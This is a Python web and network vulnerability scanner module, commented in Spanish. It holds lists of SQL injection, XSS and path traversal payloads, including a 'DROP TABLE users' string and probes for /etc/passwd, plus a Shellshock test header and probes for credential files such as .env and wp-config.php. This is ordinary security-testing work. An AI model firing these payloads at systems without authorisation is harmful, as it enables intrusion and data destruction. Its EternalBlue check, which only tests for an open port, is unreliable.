#!/usr/bin/env python3
"""
Advanced Scanner Module para KaliScanner
Incluye funcionalidades avanzadas como escaneo de directorios, SQL injection, etc.
"""

import requests
import subprocess
import json
import re
import time
import threading
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
import socket
import ssl
import dns.resolver
from dataclasses import dataclass
from typing import List, Dict, Optional
import base64

@dataclass
class WebVulnerability:
    """Vulnerabilidad web encontrada"""
    url: str
    vulnerability_type: str
    severity: str
    description: str
    payload: str = ""
    evidence: str = ""

class WebScanner:
    """Escáner de vulnerabilidades web"""
    
    def __init__(self, timeout=10, user_agent="KaliScanner/1.0"):
        self.timeout = timeout
        self.user_agent = user_agent
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': self.user_agent})
        
    def scan_web_vulnerabilities(self, url: str) -> List[WebVulnerability]:
        """Escanear vulnerabilidades web en una URL"""
        vulnerabilities = []
        
        # Normalizar URL
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        print(f"[+] Escaneando vulnerabilidades web en {url}")
        
        try:
            # Verificar si el sitio está activo
            response = self.session.get(url, timeout=self.timeout)
            
            # Escaneos específicos
            vulnerabilities.extend(self._check_sql_injection(url))
            vulnerabilities.extend(self._check_xss(url))
            vulnerabilities.extend(self._check_directory_traversal(url))
            vulnerabilities.extend(self._check_sensitive_files(url))
            vulnerabilities.extend(self._check_security_headers(url, response))
            vulnerabilities.extend(self._check_ssl_vulnerabilities(url))
            
        except requests.RequestException as e:
            print(f"[-] Error conectando a {url}: {e}")
            
        return vulnerabilities
    
    def _check_sql_injection(self, base_url: str) -> List[WebVulnerability]:
        """Verificar vulnerabilidades de SQL Injection"""
        vulnerabilities = []
        
        # Payloads básicos de SQL injection
        sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 'x'='x",
            "1' OR '1'='1' #",
            "admin'--",
            "' OR 1=1#"
        ]
        
        # Parámetros comunes para probar
        test_params = ['id', 'user', 'username', 'search', 'q', 'query', 'page']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    test_url = f"{base_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Buscar indicadores de SQL injection
                    sql_errors = [
                        "mysql_fetch_array",
                        "ORA-01756",
                        "Microsoft OLE DB Provider",
                        "PostgreSQL query failed",
                        "SQLite error",
                        "mysql_num_rows",
                        "Warning: mysql",
                        "MySQL Error",
                        "SQL syntax error"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            vuln = WebVulnerability(
                                url=test_url,
                                vulnerability_type="SQL Injection",
                                severity="HIGH",
                                description=f"Posible SQL Injection en parámetro '{param}'",
                                payload=payload,
                                evidence=error
                            )
                            vulnerabilities.append(vuln)
                            break
                            
                except requests.RequestException:
                    continue
                    
        return vulnerabilities
    
    def _check_xss(self, base_url: str) -> List[WebVulnerability]:
        """Verificar vulnerabilidades XSS"""
        vulnerabilities = []
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        test_params = ['search', 'q', 'query', 'name', 'comment', 'message']
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    test_url = f"{base_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Verificar si el payload se refleja sin filtrar
                    if payload in response.text:
                        vuln = WebVulnerability(
                            url=test_url,
                            vulnerability_type="Cross-Site Scripting (XSS)",
                            severity="MEDIUM",
                            description=f"Posible XSS reflejado en parámetro '{param}'",
                            payload=payload,
                            evidence="Payload reflejado sin filtrar"
                        )
                        vulnerabilities.append(vuln)
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities
    
    def _check_directory_traversal(self, base_url: str) -> List[WebVulnerability]:
        """Verificar vulnerabilidades de Directory Traversal"""
        vulnerabilities = []
        
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]
        
        test_params = ['file', 'path', 'page', 'include', 'doc', 'document']
        
        for param in test_params:
            for payload in traversal_payloads:
                try:
                    test_url = f"{base_url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    # Buscar contenido de archivos del sistema
                    if re.search(r'root:.*:0:0:', response.text) or \
                       re.search(r'# Copyright.*Microsoft Corp', response.text):
                        vuln = WebVulnerability(
                            url=test_url,
                            vulnerability_type="Directory Traversal",
                            severity="HIGH",
                            description=f"Directory Traversal en parámetro '{param}'",
                            payload=payload,
                            evidence="Contenido de archivo del sistema detectado"
                        )
                        vulnerabilities.append(vuln)
                        
                except requests.RequestException:
                    continue
                    
        return vulnerabilities
    
    def _check_sensitive_files(self, base_url: str) -> List[WebVulnerability]:
        """Verificar archivos sensibles expuestos"""
        vulnerabilities = []
        
        sensitive_files = [
            'robots.txt',
            'sitemap.xml',
            '.htaccess',
            'web.config',
            'config.php',
            'database.php',
            'wp-config.php',
            '.env',
            'backup.sql',
            'dump.sql',
            'admin.php',
            'login.php',
            'phpmyadmin/',
            'adminer.php',
            '.git/config',
            '.svn/entries',
            'server-status',
            'server-info'
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = urljoin(base_url, file_path)
                response = self.session.get(test_url, timeout=self.timeout)
                
                if response.status_code == 200 and len(response.text) > 0:
                    # Verificar que no sea una página de error
                    if not any(error in response.text.lower() for error in ['404', 'not found', 'error']):
                        severity = "HIGH" if file_path in ['.env', 'config.php', 'wp-config.php'] else "MEDIUM"
                        
                        vuln = WebVulnerability(
                            url=test_url,
                            vulnerability_type="Sensitive File Exposure",
                            severity=severity,
                            description=f"Archivo sensible expuesto: {file_path}",
                            evidence=f"HTTP {response.status_code} - {len(response.text)} bytes"
                        )
                        vulnerabilities.append(vuln)
                        
            except requests.RequestException:
                continue
                
        return vulnerabilities
    
    def _check_security_headers(self, url: str, response: requests.Response) -> List[WebVulnerability]:
        """Verificar headers de seguridad"""
        vulnerabilities = []
        
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection missing',
            'X-XSS-Protection': 'XSS protection header missing',
            'X-Content-Type-Options': 'MIME type sniffing protection missing',
            'Strict-Transport-Security': 'HSTS header missing',
            'Content-Security-Policy': 'CSP header missing',
            'X-Content-Security-Policy': 'Legacy CSP header missing'
        }
        
        for header, description in security_headers.items():
            if header not in response.headers:
                vuln = WebVulnerability(
                    url=url,
                    vulnerability_type="Missing Security Header",
                    severity="LOW",
                    description=description,
                    evidence=f"Header '{header}' not found"
                )
                vulnerabilities.append(vuln)
                
        return vulnerabilities
    
    def _check_ssl_vulnerabilities(self, url: str) -> List[WebVulnerability]:
        """Verificar vulnerabilidades SSL/TLS"""
        vulnerabilities = []
        
        if not url.startswith('https://'):
            return vulnerabilities
            
        try:
            parsed_url = urlparse(url)
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Crear contexto SSL
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((hostname, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    
                    # Verificar versión SSL/TLS
                    if ssock.version() in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                        vuln = WebVulnerability(
                            url=url,
                            vulnerability_type="Weak SSL/TLS Version",
                            severity="MEDIUM",
                            description=f"Versión SSL/TLS insegura: {ssock.version()}",
                            evidence=f"Protocol: {ssock.version()}"
                        )
                        vulnerabilities.append(vuln)
                    
                    # Verificar cifrado débil
                    if cipher and 'RC4' in cipher[0] or 'DES' in cipher[0]:
                        vuln = WebVulnerability(
                            url=url,
                            vulnerability_type="Weak SSL Cipher",
                            severity="MEDIUM",
                            description=f"Cifrado SSL débil: {cipher[0]}",
                            evidence=f"Cipher: {cipher[0]}"
                        )
                        vulnerabilities.append(vuln)
                        
        except Exception as e:
            pass
            
        return vulnerabilities

class NetworkScanner:
    """Escáner de red avanzado"""
    
    def __init__(self):
        self.dns_servers = ['8.8.8.8', '1.1.1.1', '208.67.222.222']
        
    def dns_enumeration(self, domain: str) -> Dict[str, List[str]]:
        """Enumeración DNS completa"""
        results = {
            'A': [],
            'AAAA': [],
            'MX': [],
            'NS': [],
            'TXT': [],
            'CNAME': [],
            'SOA': []
        }
        
        print(f"[+] Enumerando DNS para {domain}")
        
        for record_type in results.keys():
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = self.dns_servers
                
                answers = resolver.resolve(domain, record_type)
                for answer in answers:
                    results[record_type].append(str(answer))
                    
            except Exception:
                continue
                
        return results
    
    def subdomain_enumeration(self, domain: str) -> List[str]:
        """Enumeración de subdominios"""
        subdomains = []
        
        # Lista de subdominios comunes
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api',
            'blog', 'shop', 'store', 'support', 'help', 'docs', 'cdn',
            'static', 'media', 'images', 'img', 'assets', 'files',
            'download', 'uploads', 'backup', 'old', 'new', 'beta',
            'demo', 'sandbox', 'portal', 'app', 'mobile', 'm',
            'secure', 'ssl', 'vpn', 'remote', 'access', 'login'
        ]
        
        print(f"[+] Enumerando subdominios para {domain}")
        
        def check_subdomain(subdomain):
            try:
                full_domain = f"{subdomain}.{domain}"
                socket.gethostbyname(full_domain)
                return full_domain
            except socket.gaierror:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(check_subdomain, sub) for sub in common_subdomains]
            for future in futures:
                result = future.result()
                if result:
                    subdomains.append(result)
                    print(f"[+] Subdominio encontrado: {result}")
        
        return subdomains
    
    def port_banner_grab(self, host: str, port: int) -> str:
        """Obtener banner de un puerto específico"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # Enviar petición HTTP si es puerto web
            if port in [80, 8080, 8000, 8888]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            elif port == 443:
                # Para HTTPS necesitaríamos SSL
                pass
            elif port in [21, 22, 23, 25, 110, 143]:
                # Estos servicios suelen enviar banner automáticamente
                pass
            else:
                # Intentar enviar datos genéricos
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
            
        except Exception:
            return ""

class ExploitScanner:
    """Escáner de exploits y vulnerabilidades específicas"""
    
    def __init__(self):
        self.exploits_db = {
            'EternalBlue': {
                'ports': [445],
                'description': 'MS17-010 EternalBlue SMB vulnerability',
                'severity': 'CRITICAL'
            },
            'Shellshock': {
                'ports': [80, 443],
                'description': 'Bash CGI vulnerability (CVE-2014-6271)',
                'severity': 'HIGH'
            },
            'Heartbleed': {
                'ports': [443],
                'description': 'OpenSSL Heartbleed vulnerability (CVE-2014-0160)',
                'severity': 'HIGH'
            }
        }
    
    def check_eternalblue(self, host: str) -> bool:
        """Verificar vulnerabilidad EternalBlue"""
        try:
            # Implementación básica - en producción usaríamos herramientas específicas
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host, 445))
            sock.close()
            
            if result == 0:
                # Puerto SMB abierto - necesitaríamos verificación más específica
                print(f"[!] Puerto SMB abierto en {host} - verificar EternalBlue manualmente")
                return True
                
        except Exception:
            pass
            
        return False
    
    def check_shellshock(self, host: str, port: int) -> bool:
        """Verificar vulnerabilidad Shellshock"""
        try:
            # Payload básico de Shellshock
            headers = {
                'User-Agent': '() { :; }; echo; echo "SHELLSHOCK_TEST"',
                'Referer': '() { :; }; echo; echo "SHELLSHOCK_TEST"'
            }
            
            url = f"http://{host}:{port}/cgi-bin/test"
            response = requests.get(url, headers=headers, timeout=5)
            
            if "SHELLSHOCK_TEST" in response.text:
                return True
                
        except Exception:
            pass
            
        return False

def run_advanced_scan(target: str, scan_type: str = "all") -> Dict:
    """Ejecutar escaneo avanzado"""
    results = {
        'target': target,
        'timestamp': time.time(),
        'web_vulnerabilities': [],
        'dns_info': {},
        'subdomains': [],
        'exploits': []
    }
    
    if scan_type in ['all', 'web']:
        # Escaneo web
        web_scanner = WebScanner()
        results['web_vulnerabilities'] = web_scanner.scan_web_vulnerabilities(target)
    
    if scan_type in ['all', 'dns']:
        # Enumeración DNS
        network_scanner = NetworkScanner()
        if not target.replace('.', '').replace('-', '').isdigit():  # Si no es IP
            results['dns_info'] = network_scanner.dns_enumeration(target)
            results['subdomains'] = network_scanner.subdomain_enumeration(target)
    
    if scan_type in ['all', 'exploit']:
        # Verificación de exploits
        exploit_scanner = ExploitScanner()
        
        # Verificar EternalBlue
        if exploit_scanner.check_eternalblue(target):
            results['exploits'].append({
                'name': 'EternalBlue',
                'severity': 'CRITICAL',
                'description': 'Posible vulnerabilidad EternalBlue (MS17-010)'
            })
    
    return results

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Advanced Scanner para KaliScanner")
    parser.add_argument('-t', '--target', required=True, help='Target a escanear')
    parser.add_argument('-s', '--scan-type', choices=['all', 'web', 'dns', 'exploit'], 
                       default='all', help='Tipo de escaneo')
    
    args = parser.parse_args()
    
    print(f"🔍 Iniciando escaneo avanzado de {args.target}")
    results = run_advanced_scan(args.target, args.scan_type)
    
    # Mostrar resultados
    print("\n📊 RESULTADOS DEL ESCANEO AVANZADO")
    print("=" * 50)
    
    if results['web_vulnerabilities']:
        print(f"\n🌐 Vulnerabilidades Web ({len(results['web_vulnerabilities'])})")
        for vuln in results['web_vulnerabilities']:
            print(f"  [{vuln.severity}] {vuln.vulnerability_type}")
            print(f"      URL: {vuln.url}")
            print(f"      Descripción: {vuln.description}")
    
    if results['dns_info']:
        print(f"\n🔍 Información DNS")
        for record_type, records in results['dns_info'].items():
            if records:
                print(f"  {record_type}: {', '.join(records)}")
    
    if results['subdomains']:
        print(f"\n🌍 Subdominios ({len(results['subdomains'])})")
        for subdomain in results['subdomains']:
            print(f"  - {subdomain}")
    
    if results['exploits']:
        print(f"\n💥 Exploits Detectados ({len(results['exploits'])})")
        for exploit in results['exploits']:
            print(f"  [{exploit['severity']}] {exploit['name']}")
            print(f"      {exploit['description']}")
    
    print("\n✅ Escaneo avanzado completado")
